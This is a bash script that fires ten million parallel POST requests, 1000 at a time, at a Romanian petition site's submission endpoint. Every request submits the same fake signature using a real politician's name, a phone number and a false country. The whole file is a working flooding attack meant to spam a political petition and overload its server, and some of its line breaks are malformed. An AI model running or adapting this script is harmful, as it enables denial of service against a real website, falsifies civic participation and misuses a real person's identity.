#!/bin/bash

total_executions=10000000
url="https://alegerilibere.ro/petitie.php"

counter_file="/tmp/request_counter"
parallelism=1000 

echo
 0 > "$counter_file"


increment_counter
() {
  count=$(cat "$counter_file")
  count=$((count + 1))

echo
 "$count" > "$counter_file"

echo
 -ne "Requests sent successfully: $count\r"
}
send_request
() {
  response=$(curl --location "$url" \
    --header "Content-Type: application/json" \
    --data-raw '{
      "phone": "0754779920",
      "nume": "George Simion",
      "tara": "Algerie",
      "accept_gdpr": "on"
    }' \
    --silent --output /dev/null --write-out "%{http_code}")

  if [[ $response -eq 200 ]]; then
    increment_counter
  else
    echo "Request failed with HTTP code: $response" >&2
  fi
}

export -f send_request
export -f increment_counter
export url
export counter_file


seq "$total_executions" | xargs -n1 -P"$parallelism" -I{} bash -c 'send_request'

echo "All requests completed."